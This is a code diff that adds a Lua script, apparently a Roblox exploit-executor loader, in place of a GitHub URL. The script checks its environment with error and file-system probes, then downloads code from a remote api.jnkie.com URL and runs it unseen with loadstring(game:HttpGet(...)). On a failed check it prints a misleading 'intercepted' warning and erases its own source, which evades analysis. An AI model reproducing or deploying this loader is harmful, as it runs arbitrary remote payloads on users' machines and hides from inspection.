@@ -1,1 +1,43 @@
-https://github.com/tfcygvunbind/557/edit/main/%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F
+local function probeArith()
+    local chunk, _ = loadstring([[
+        local a = "hello"
+        local b = 2
+        return a - b
+    ]])
+    if not chunk then return false end
+
+    local ok, _ = pcall(chunk)
+    return not ok        
+end
+
+local function probeCall()
+    local ok, _ = pcall(function() (nil)() end)
+    return not ok
+end
+
+local function probeFS()
+    local ok, _ = pcall(function()
+        if not isfolder("BS_script") then makefolder("BS_script") end
+        if not isfolder("BS_script/Music") then makefolder("BS_script/Music") end
+    end)
+    return ok and isfolder("BS_script/Music")
+end
+
+local function coreLogic()
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/720e60cba164d2a7ac02ce7b93b3c5b90105cd0ef6c083cc22403bb58014db96/download"))()
+end
+
+local function safeEntry()
+    if not probeArith() then return nil, "block:arith" end
+    if not probeCall()  then return nil, "block:call"  end
+    if not probeFS()    then return nil, "block:fs"    end
+    return coreLogic()
+end
+
+local success, tag = safeEntry()
+if not success then
+    warn("lEAI:已拦截异常执行 (" .. tostring(tag) .. ")")
+    script:ClearAllChildren()
+    script.Source = ""
+    return
+end
